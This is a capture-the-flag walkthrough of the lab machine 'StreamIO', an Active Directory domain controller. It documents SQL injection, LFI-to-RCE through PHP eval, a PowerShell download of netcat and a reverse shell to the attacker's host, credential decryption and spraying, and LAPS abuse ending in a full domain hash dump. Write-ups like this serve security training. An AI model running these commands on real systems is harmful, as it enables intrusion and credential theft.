# StreamIO

## Enumeration
### Nmap
Nmap all ports:
```bash
$ sudo nmap -p- --min-rate=1000 -T4 10.129.186.63 

Nmap scan report for 10.129.186.63
Host is up (0.27s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49697/tcp open  unknown
52483/tcp open  unknown
```

Nmap safe scripts on open ports:
```bash
$ sudo nmap -sC -sV -p 53,80,88,135,443,445,464,593,636,3268,3269,5985,9389,49667,49669,49670,49697,52483 10.129.186.63 -o nmap.txt

Nmap scan report for 10.129.186.63
Host is up (0.33s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-06-05 08:14:15Z)
135/tcp   open  msrpc         Microsoft Windows RPC
443/tcp   open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
| ssl-cert: Subject: commonName=streamIO/countryName=EU
| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb
| Not valid before: 2022-02-22T07:03:28
|_Not valid after:  2022-03-24T07:03:28
| tls-alpn: 
|_  http/1.1
|_ssl-date: 2022-06-05T08:15:52+00:00; +6h59m35s from scanner time.
|_http-title: Not Found
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
52483/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-06-05T08:15:10
|_  start_date: N/A
|_clock-skew: mean: 6h59m35s, deviation: 0s, median: 6h59m34s
```

I see there is a couple of DNS entries in the output of port 443:
- DNS:streamIO.htb
- DNS:watch.streamIO.htb

We can add those to our `/etc/hosts` file:
```
...[SNIP]...

10.129.186.63   streamIO.htb watch.streamIO.htb

...[SNIP]...
```


### StreamIO - Port 443
Browsing to https://streamio.htb the page loads an Online Movie Streaming service. There is a login page where it asks for username and password at https://streamio.htb/login.php.
![](images/image01.png)

We can use Burp to intercept a login attempt and save it to a file where we will use sqlmap to check for sql injections:
![](images/image02.png)

SQL injection found in `username` parameter:
```bash
$ sqlmap -r login.req --batch --force-ssl

...[SNIP]...
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N                                                        
sqlmap identified the following injection point(s) with a total of 64 HTTP(s) requests:                                                                  
---                                                                                                                                                      
Parameter: username (POST)                                                                                                                               
    Type: stacked queries                                                                                                                                
    Title: Microsoft SQL Server/Sybase stacked queries (comment)                                                                                         
    Payload: username=caue';WAITFOR DELAY '0:0:5'--&password=test                                                                                        
---
```

Since the sql injection is time-based it is taking a very long time to retrieve data.

Dumping the databases:
```bash
$ sqlmap -r login.req --batch --force-ssl --dbs

available databases [5]:
[*] model
[*] msdb
[*] STREAMIO
[*] streamio_backup
[*] tempdb
```

 At this point we can start guessing some of the table names to make it quicker. For example, we can guess that there is a table called "users" in the STREAMIO database, as the name indicates it is the web app with the login page.

Dumping the table `users` from STREAMIO db we see that there is 33 users, it will take forever to finish. Anyway, here is the syntax:
```bash
$ sqlmap -r login.req --batch --force-ssl -D STREAMIO -T users --dump

...[SNIP]...

| id | is_staff | password                         | username          |
| 31 | 1        | b779ba15cedfd22a023c4d8bcf5f2332 | yoshihide         | 

...[SNIP]...
```

We get a lot of users and password hashes. Trying to crack them with [Crackstation](https://crackstation.net/) we end up with:
```
username = yoshihide
password = '66boysandgirls..'
```

We can use this credentials to login to https://streamio.htb/login.php.
Logged in as `yoshihide` not much changed in the website, running gobuster we find the `/admin` endpoint.
```bash
$ gobuster dir -u https://streamio.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -x php -k

...[SNIP]...

/admin                (Status: 301) [Size: 150] [--> https://streamio.htb/admin/]

...[SNIP]...
```

### LFI to RCE
![](images/image03.png)

Browsing around at https://streamio.htb/admin/ we see that all the pages ends with a parameter:
- https://streamio.htb/admin/?user=
- https://streamio.htb/admin/?staff=
- https://streamio.htb/admin/?movie=
- https://streamio.htb/admin/?message=

 We can fuzz it to see if we can find some more. Using wfuzz we specify the `--hw 131` to hide all responses with 131 words, `-b PHPSESSID` to specify the admin cookie and `-w` the wordlist used.
```bash
$ wfuzz --hw 131 -b PHPSESSID=luoqop4jub9vubjbl5ngnblrb1 -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt 'https://streamio.htb/admin/?FUZZ='

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://streamio.htb/admin/?FUZZ=
Total requests: 3132

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                 
=====================================================================

000000514:   200        49 L     137 W      1712 Ch     "debug"

...[SNIP]...

```

After some testing, we find the `debug` parameter is vulnerable to LFI:
![](images/image04.png)

Using the PHP filter trick we can extract some of the web pages source code. The important parts here are in the source code of:
https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=index.php
```php
...[SNIP]...

$connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');
$handle = sqlsrv_connect('(local)',$connection);

...[SNIP]...
```

So we have the database username and password, but how to use it? After getting stuck here for a while I decided to fuzz the file name in the LFI to see if I can get more source code:
```bash
$ wfuzz --hh 1712 -b PHPSESSID=luoqop4jub9vubjbl5ngnblrb1 -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt 'https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=FUZZ.php'

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=FUZZ.php
Total requests: 3132

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                 
=====================================================================

000000908:   200        49 L     137 W      4916 Ch     "Index"                                                                                 
000000909:   200        49 L     137 W      4916 Ch     "index"                                                                                 
000001118:   200        49 L     137 W      5788 Ch     "master"
```

Cool, we have a `master.php` file as well! Doing a bit of code analyses in this file we finally see the path to get a shell. 
The file `master.php` is using the function `eval` like this:
```php
...[SNIP]...

<?php
if(isset($_POST['include']))
{
if($_POST['include'] !== "index.php" ) 
eval(file_get_contents($_POST['include']));
else
echo(" ---- ERROR ---- ");
}
?>
```

The code logic above simply says that if a user sends a POST request to `master.php` with data different than `index.php` in the parameter `include` it will pass to `eval`. It is a RCE vulnerability.

### RCE - Foothold
We can base64 encode our code to be passed to `eval` like this:
```bash
$ echo 'system($_REQUEST["cmd"]);' | base64
c3lzdGVtKCRfUkVRVUVTVFsiY21kIl0pOwo=
```
The above will include a new parameter that we can use to run system commands in the `master.php` file.

And then we can send system commands like this:
```bash
$ curl -s -k -X 'POST' -H 'Content-Type: application/x-www-form-urlencoded' -b 'PHPSESSID=luoqop4jub9vubjbl5ngnblrb1' --data-binary "include=data://text/plain;base64,c3lzdGVtKCRfUkVRVUVTVFsiY21kIl0pOwo=" 'https://streamio.htb/admin/?debug=master.php&cmd=dir' | grep '<input name="include" hidden>' -A 9999 |grep '</div>' -B 9999 | tail -n +3 | head -n -1

Volume in drive C has no label.
 Volume Serial Number is A381-2B63

 Directory of C:\inetpub\streamio.htb\admin

02/22/2022  03:49 AM    <DIR>          .
02/22/2022  03:49 AM    <DIR>          ..
02/22/2022  03:49 AM    <DIR>          css
02/22/2022  03:49 AM    <DIR>          fonts
02/22/2022  03:49 AM    <DIR>          images
06/03/2022  01:51 AM             2,401 index.php
02/22/2022  04:19 AM    <DIR>          js
06/03/2022  01:53 AM             3,055 master.php
02/23/2022  03:16 AM               878 movie_inc.php
02/23/2022  03:16 AM               936 staff_inc.php
02/23/2022  03:16 AM               879 user_inc.php
               5 File(s)          8,149 bytes
               6 Dir(s)   5,373,267,968 bytes free
```

We learn that we are in the directory `C:\inetpub\streamio.htb\admin`. To get a reverse shell here we can just upload netcat and then run netcat remotely to send us a reverse shell.

If the upload fails, the directory `C:\Windows\System32\spool\drivers\color\nc.exe` is always a good one to upload files as it is often whitelisted by the AV.

Using the same Curl command as above we can change the `cmd=` value to:
```bash
# Upload netcat
cmd=powershell.exe+iwr+-uri+10.10.14.30/nc.exe+-outfile+"C:/inetpub/streamio.htb/admin/nc.exe"

# Get a reverse shell
cmd=C:/inetpub/streamio.htb/admin/nc.exe+-e+powershell+10.10.14.30+9001
```

Receiving the reverse shell:
```bash
$ rlwrap nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.14.30] from (UNKNOWN) [10.129.186.175] 49935
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\inetpub\streamio.htb\admin> whoami
streamio\yoshihide
```

## Shell as yoshihide
### Enumerating the machine
Enumerating users:
```powershell
PS C:\inetpub\streamio.htb\admin> net user
net user

User accounts for \\DC

-------------------------------------------------------------------------------
Administrator            Guest                    JDgodd                   
krbtgt                   Martin                   nikk37                   
yoshihide                
The command completed successfully.
```

We can see that `Martin` is member of Administrator group:
```powershell
PS C:\inetpub\streamio.htb\admin> net user Martin /domain
net user Martin /domain
User name                    Martin
Full Name                    
Comment                      
Users comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/26/2022 4:16:42 PM
Password expires             Never
Password changeable          5/27/2022 4:16:42 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   6/5/2022 12:35:13 AM

Logon hours allowed          All

Local Group Memberships      *Administrators       *Remote Management Use
Global Group memberships     *Domain Users
```

We might need to find a way to escalate from `yoshihide` to `Martin` or `Administrator`.

Enumerating the network - Ports listening:
```powershell
PS C:\inetpub\streamio.htb\admin> netstat -ano | findstr LISTENING                                                                                                                         

  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4                                                                                 
  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       616
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       884
  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       616
  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       616
  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       884
  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       616
  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING       3584
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING       2592
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       472
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1076
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1456
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       616
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       616
  TCP    0.0.0.0:49670          0.0.0.0:0              LISTENING       616
  TCP    0.0.0.0:49682          0.0.0.0:0              LISTENING       608
  TCP    0.0.0.0:49697          0.0.0.0:0              LISTENING       2776
  TCP    0.0.0.0:60269          0.0.0.0:0              LISTENING       2748
  TCP    10.129.186.175:53      0.0.0.0:0              LISTENING       2776
  TCP    10.129.186.175:139     0.0.0.0:0              LISTENING       4
...[SNIP]...
```

If we compare the ports here with the ones we got in the nmap port scan we will find some differences. One of them is the **port 1433 (MSSQL)** is listening internally only and we have the credentials for the database. We can use `chisel` to forward this port to our machine so we can use some pentest tools.

### Forward MSSQL port to our local machine
Download chisel for linux and windows:
```bash
# Chisel for linux
$ wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz

# Chisel for windows
$ wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_windows_amd64.gz
```

Start chisel server in our machine:
```bash
$ ./chisel server -p 8000 --reverse
```

Upload chisel for windows to the target and forward port 1433:
```powershell
PS C:\inetpub\streamio.htb\admin> wget 10.10.14.30/chisel.exe -o chisel.exe

PS C:\inetpub\streamio.htb\admin> .\chisel.exe client 10.10.14.30:8000 R:1433:127.0.0.1:1433
```

Now we can connect to MSSQL using the credentials we found earlier:
```bash
$ sqsh -S 127.0.0.1 -U db_admin -P 'B1@hx31234567890'
```

Enumerating the databases:
```bash
1> SELECT name, database_id, create_date                                                                                                                 
FROM sys.databases
2> go

master                 
tempdb
model                                                                                                                                            
msdb
STREAMIO
streamio_backup
```

Lets dum the users table of streamio_backup database:
```bash
1> use streamio_backup                                                                                                                                   
2> go                                                                                                                                                    
1> select * from users                                                                                                                                   
2> go

1 nikk37        389d14cb8e4e9b94b137deb1caf0612a                                                                                                                 
2 yoshihide     b779ba15cedfd22a023c4d8bcf5f2332                                                                                                                 
3 James         c660060492d9edcaa8332d89c99c9239                                                                                                                 
4 Theodore      925e5408ecb67aea449373d668b7359e                                                                                                                 
5 Samantha      083ffae904143c4796e464dac33c1f7d                                                                                                                 
6 Lauren        08344b85b329d7efd611b7a7743e8a09                                                                                                                 
7 William       d62be0dc82071bccc1322d64ec5b6c51                                                                                                                 
8 Sabrina       f87d3c0d6c8fd686aacc6627f1f493a5
```

The important credentials found here is `nikk37` user as it is also a user in the machine. Using Crackstation we can crack the password:
```bash
Username: nikk37
Password: get_dem_girls2@yahoo.com
```

## Shell as Nikk37
Using `nikk37` credentials we can connect to the target via WinRM:
```bash
$ evil-winrm -u nikk37 -p 'get_dem_girls2@yahoo.com' -i 10.129.186.175

PS C:\Users\nikk37\Documents> whoami
streamio\nikk37
```

Get the user flag:
```powershell
PS C:\Users\nikk37\desktop> type user.txt
053a212058dd2bd731b25d4a8fc6d4e6
```

Enumerating `nikk37` files we find a Firefox database file `key4.db` and 2 interesintg json files, `logins.json` and `logins-backup.json`:
```Powershell
PS C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release> dir

Directory: C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/22/2022   2:40 AM                bookmarkbackups
d-----        2/22/2022   2:40 AM                browser-extension-data
d-----        2/22/2022   2:41 AM                crashes
d-----        2/22/2022   2:42 AM                datareporting
d-----        2/22/2022   2:40 AM                minidumps
d-----        2/22/2022   2:42 AM                saved-telemetry-pings
d-----        2/22/2022   2:40 AM                security_state
d-----        2/22/2022   2:42 AM                sessionstore-backups
d-----        2/22/2022   2:40 AM                storage
-a----        2/22/2022   2:40 AM             24 addons.json
-a----        2/22/2022   2:42 AM           5189 addonStartup.json.lz4
-a----        2/22/2022   2:42 AM            310 AlternateServices.txt
-a----        2/22/2022   2:41 AM         229376 cert9.db
-a----        2/22/2022   2:40 AM            208 compatibility.ini
-a----        2/22/2022   2:40 AM            939 containers.json
-a----        2/22/2022   2:40 AM         229376 content-prefs.sqlite
-a----        2/22/2022   2:40 AM          98304 cookies.sqlite
-a----        2/22/2022   2:40 AM           1081 extension-preferences.json
-a----        2/22/2022   2:40 AM          43726 extensions.json
-a----        2/22/2022   2:42 AM        5242880 favicons.sqlite
-a----        2/22/2022   2:41 AM         262144 formhistory.sqlite
-a----        2/22/2022   2:40 AM            778 handlers.json
-a----        2/22/2022   2:40 AM         294912 key4.db
-a----        2/22/2022   2:41 AM           1593 logins-backup.json
-a----        2/22/2022   2:41 AM           2081 logins.json
-a----        2/22/2022   2:42 AM              0 parent.lock
-a----        2/22/2022   2:42 AM          98304 permissions.sqlite
-a----        2/22/2022   2:40 AM            506 pkcs11.txt
-a----        2/22/2022   2:42 AM        5242880 places.sqlite
-a----        2/22/2022   2:42 AM           8040 prefs.js
-a----        2/22/2022   2:42 AM            180 search.json.mozlz4
-a----        2/22/2022   2:42 AM            288 sessionCheckpoints.json
-a----        2/22/2022   2:42 AM           1853 sessionstore.jsonlz4
-a----        2/22/2022   2:40 AM             18 shield-preference-experiments.json
-a----        2/22/2022   2:42 AM            611 SiteSecurityServiceState.txt
-a----        2/22/2022   2:42 AM           4096 storage.sqlite
-a----        2/22/2022   2:40 AM             50 times.json
-a----        2/22/2022   2:40 AM          98304 webappsstore.sqlite
-a----        2/22/2022   2:42 AM            141 xulstore.json
```

We use Evil-WinRM to download to our machine and then try to crack it:
```Powershell
# We need to use the full path!
PS C:\Users\nikk37> download C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\key4.db key4.db
```

Download `logins.json`
```powershell
# We need to use the full path!
PS C:\Users\nikk37> download C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\logins.json logins.json
```

We can use [Firepwd](https://github.com/lclevy/firepwd) tool to crack the DB:
```bash
# We use -d to specify the directory where key4.db and logins.json are saved
$ python firepwd.py -d ../www/
...[SNIP]...
decrypting login/password pairs
https://slack.streamio.htb:b'admin',b'JDg0dd1s@d0p3cr3@t0r'
https://slack.streamio.htb:b'nikk37',b'n1kk1sd0p3t00:)'
https://slack.streamio.htb:b'yoshihide',b'paddpadd@12'
https://slack.streamio.htb:b'JDgodd',b'password@12'
```


### SMB password spray
Now that we have many users and passwords we can use crackmapexec to do a password spray. I got all the users we found so far in a file called `users.txt` and the same for passwords and put it in `password.txt`:
![](images/image05.png)

```bash
$ cme smb streamio.htb -u users.txt -p passwords.txt --continue-on-success
...[SNIP]...
SMB streamIO.htb 445 DC [+] streamIO.htb\nikk37:get_dem_girls2@yahoo.com 
...[SNIP]...
SMB streamIO.htb 445 DC [+] streamIO.htb\jdgodd:JDg0dd1s@d0p3cr3@t0r
...[SNIP]...
```
Very important to use `--continue-on-success` flag, otherwise crackmapexec will stop when he finds a valid login.

Cool! We got one more credentials, for `jdgodd` user:
```
Username: jdgodd
Password: JDg0dd1s@d0p3cr3@t0r
```

### Bloodhound
We still don't know the path to `martin` or `administrator`. Lets run Bloodhound to map the AD for us and show some graphs!
Run [SharpHound](https://github.com/BloodHoundAD/SharpHound) in the target to extract the data:
```bash
*Evil-WinRM* PS C:\Users\nikk37> .\SharpHound.exe -c all

2022-06-06T03:46:48.9960341-07:00|INFORMATION|Status: 97 objects finished (+97 2.204545)/s -- Using 40 MB RAM
2022-06-06T03:46:48.9960341-07:00|INFORMATION|Enumeration finished in 00:00:44.2927695
2022-06-06T03:46:49.1835426-07:00|INFORMATION|SharpHound Enumeration Completed at 3:46 AM on 6/6/2022! Happy Graphing!
```

Download the loot to our machine:
```
*Evil-WinRM* PS C:\Users\nikk37> download C:\Users\nikk37\20220606034648_BloodHound.zip bloodhound-loot.zip
```

Start neo4j server:
```bash
$ sudo neo4j console
```

Start Bloodhound, login to neo4j and import the loot (simply drag-and-drop the .zip)!
```
$ ./BloodHound
```

Mark the user we owned:
![](images/image06.png)
I also marked `martin` as a High Value.
From the Bloodhound output there is no direct path from `nikk37` to admins accounts.

We have `jdgodd` password, so lets mark him as owned too. As we select the  "Shortest Path to Owned Principals" we finally see tha path to Administrator:
![](images/image07.png)

The user `jdgodd` has WriteOwner privileges over "CORE STAFF" group. Whoever is a member of CORE STAFF group can read the LAPS!
What is LAPS?
*The "Local Administrator Password Solution" (LAPS) provides management of local account passwords of domain joined computers. Passwords are stored in Active Directory (AD) and protected by ACL, so only eligible users can read it or request its reset.*

## Privilege Escalation
First lets upload [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1):
```powershell
PS C:\Users\nikk37> upload PowerView.ps1
PS C:\Users\nikk37> Import-Module ./PowerView.ps1
```
*Disclaimer: For some reason only the PowerView.ps1 script from the dev branch work.*

Now we create the creds to use and set a Domain Object Owner to jdgodd:
```Powershell
PS C:\Users\nikk37> $SecPassword = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force

PS C:\Users\nikk37> $Cred = New-Object System.Management.Automation.PSCredential('streamio.htb\jdgodd', $SecPassword)

PS C:\Users\nikk37> Set-DomainObjectOwner -Credential $Cred -Identity "CORE STAFF" -OwnerIdentity jdgodd
```

Give jdgodd all the rights and add him as a member off CORE STAFF:
```Powershell
PS C:\Users\nikk37> Add-DomainObjectAcl -Credential $Cred -TargetIdentity "CORE STAFF" -PrincipalIdentity jdgodd -Rights All

PS C:\Users\nikk37> Add-DomainGroupMember -Identity "CORE STAFF" -Members "jdgodd" -Credential $Cred -Verbose
```

No errors so far, lets check if it works:
```Powershell
PS C:\Users\nikk37> Get-DomainGroupMember -Identity 'CORE STAFF'

GroupDomain             : streamIO.htb
GroupName               : CORE STAFF
GroupDistinguishedName  : CN=CORE STAFF,CN=Users,DC=streamIO,DC=htb
MemberDomain            : streamIO.htb
MemberName              : JDgodd
MemberDistinguishedName : CN=JDgodd,CN=Users,DC=streamIO,DC=htb
MemberObjectClass       : user
MemberSID               : S-1-5-21-1470860369-1569627196-4264678630-1104
```

Great! Lets dump LAPS:
```Powershell 
PS C:\Users\nikk37> Get-DomainObject dc.streamio.htb -Credential $Cred -Properties "ms-mcs-AdmPwd",name

name ms-mcs-admpwd
---- -------------
DC   !vG(xZ{)5b8!4G
```

Alternatively we can use crackmapexec to dump LAPS:
```bash
$ crackmapexec ldap 10.129.186.175 -u jdgodd -p 'JDg0dd1s@d0p3cr3@t0r' -M laps
```
![](images/image08.png)

Now we can get a shell as Administrator using Evil-Winrm:
```bash
$ evil-winrm -u Administrator -p '!vG(xZ{)5b8!4G' -i 10.129.186.175

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
streamio\administrator
```

We are Administrator!

## Post Exploitation
Dumping the secrets
```bash
$ impacket-secretsdump streamio.htb/Administrator:'!vG(xZ{)5b8!4G'@10.129.186.175

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation                                                                                                 
                                                                                                                                                         
[*] Service RemoteRegistry is in stopped state                                                                                                           
[*] Starting service RemoteRegistry                                                                                                                      
[*] Target system bootKey: 0x4dbf07084a530cfa7ab417236bd4a647                                                                                            
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)                                                                                                     
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6a559f691b75bff16a07ecbd12e3bdfb:::                                                                   
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                           
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                  
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesnt have hash information.                                                 
[*] Dumping cached domain logon information (domain/username:hash)                                                                                       
[*] Dumping LSA Secrets                                                                                                                                  
[*] $MACHINE.ACC                                                                                                                                         
streamIO\DC$:aes256-cts-hmac-sha1-96:f41cd2005b55017c66c0cda9bee4ba2db9c5a82c054a7f9dd64d4ad3ee03f591                                                    
streamIO\DC$:aes128-cts-hmac-sha1-96:ac3ca985d299f6edde2ff736307bca4b                                                                                    
streamIO\DC$:des-cbc-md5:8a576d851c9810b5                                                                                                                
streamIO\DC$:plain_password_hex:a4863e436bcb3cac53b132f0284a6b19113ef0aadf8baa5af9ac62cd2a49104d7c8c5fbd9a2d61e64e85bfb4a82426003fdd82bdaf387bb4d4b748a84
09960cfd613e97259559f694ef31396660f3a2ce952ccc50b1a072f4eeec5a7c7aea0f58c99215abc25227d8fbb0f832cc97cbd22ee7f2cc3ab1899513c42432687f0ec75860d4568022de7c4
3fa5702e1e21e9c4fd95b3a6eb9c1f7fce3e4f1263cfb78cbf99e5a1ccda31917077e9058a03449ec19fa102d8100e8ba284065a9bb78e72d57b7e2e7cf92f2f4988fc02a6a2e971aae4edf5e
4bfdec02c42e41989e553f3d89ad60e4b434e985374c363aa1038                                                                                                    
streamIO\DC$:aad3b435b51404eeaad3b435b51404ee:b043edae34baa61e727e92f0a89dc161:::                                                                        
[*] DPAPI_SYSTEM                                                                                                                                         
dpapi_machinekey:0xd8b78bca07d4bce21bce1ae04bf231978c84407f                                                                                              
dpapi_userkey:0x9b682d0f5f9b63c03827113581bc2dc4f993e3ee                                                                                                 
[*] NL$KM                                                                                                                                                
 0000   A5 68 6C 6F 0F D6 72 8F  9E DE A2 27 47 D1 73 3A   .hlo..r....G.s:                                                                              
 0010   EA FB 23 4A 58 C9 04 91  95 A2 E7 3C 63 1A E8 B1   ..#JX......<c...                                                                              
 0020   DA D8 C8 95 DD 09 23 97  A5 5A 21 74 17 17 CC C6   ......#..Z!t....                                                                              
 0030   5E 1B F7 BE 34 99 DC 39  D1 72 7B 3E 19 B6 B2 3C   ^...4..9.r{>...<
NL$KM:a5686c6f0fd6728f9edea22747d1733aeafb234a58c9049195a2e73c631ae8b1dad8c895dd092397a55a21741717ccc65e1bf7be3499dc39d1727b3e19b6b23c                   
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)                                                                                            
[*] Using the DRSUAPI method to get NTDS.DIT secrets                                                                                                     
Administrator:500:aad3b435b51404eeaad3b435b51404ee:298c11551a25b246bc4e90bc463c8325:::                                                                   
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                           
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5f5142aae3cce656285ce4504605dec1:::                                                                          
JDgodd:1104:aad3b435b51404eeaad3b435b51404ee:8846130392c4169cb552fe5b73b046af:::                                                                         
Martin:1105:aad3b435b51404eeaad3b435b51404ee:a9347432fb0034dd1814ca794793d377:::
nikk37:1106:aad3b435b51404eeaad3b435b51404ee:17a54d09dd09920420a6cb9b78534764:::
yoshihide:1107:aad3b435b51404eeaad3b435b51404ee:6d21f46be3697ba16b6edef7b3399bf4:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:b043edae34baa61e727e92f0a89dc161:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:675bf92933c97f5200468f1acba04a1db52b49fdaa4de8f7e1d2d406fceef902
Administrator:aes128-cts-hmac-sha1-96:18677934f37bf440e20c84eb841792b3
Administrator:des-cbc-md5:3b9dba3b323efd7f
krbtgt:aes256-cts-hmac-sha1-96:668ee76d84bf5ea1e845933ace27ecde98b736f218c0830cbe71e18812166cda
krbtgt:aes128-cts-hmac-sha1-96:f91f8540a9aca4af627959d1cb888f13
krbtgt:des-cbc-md5:d032029279fbc4fd
JDgodd:aes256-cts-hmac-sha1-96:53fcc54b04d560253b0fdb259b9de0da8c5c65916d12b5e4b5dd4723d9003443
JDgodd:aes128-cts-hmac-sha1-96:22e9e5268e40d1fc8198415fdd6c64bd
JDgodd:des-cbc-md5:76d0fe1a231934e5
Martin:aes256-cts-hmac-sha1-96:d5eed6cafcabd393a2101f4fadc143344c48ebaacb065490510ef608424065f0
Martin:aes128-cts-hmac-sha1-96:0a0cff37d02d1299a24fe58debb20392
Martin:des-cbc-md5:570bfd51e9f7e3bf
nikk37:aes256-cts-hmac-sha1-96:d4a44efe5740231cad3da85c294b01678840ac7a5b6207f366c36fc3c5b59347
nikk37:aes128-cts-hmac-sha1-96:eaff7bb14b5c41f80e5216cb09e16435
nikk37:des-cbc-md5:ae5ddf8fc2853e67
yoshihide:aes256-cts-hmac-sha1-96:0849b8c4eaee4edeaed2972752529251bbb616e9f24e08992923b4f18e9d73b0
yoshihide:aes128-cts-hmac-sha1-96:d668308ea96ebda1d31e3bb77b8e6768
yoshihide:des-cbc-md5:3bae5257ea029d61 
DC$:aes256-cts-hmac-sha1-96:f41cd2005b55017c66c0cda9bee4ba2db9c5a82c054a7f9dd64d4ad3ee03f591
DC$:aes128-cts-hmac-sha1-96:ac3ca985d299f6edde2ff736307bca4b
DC$:des-cbc-md5:e62aa7866b0bc4ec
```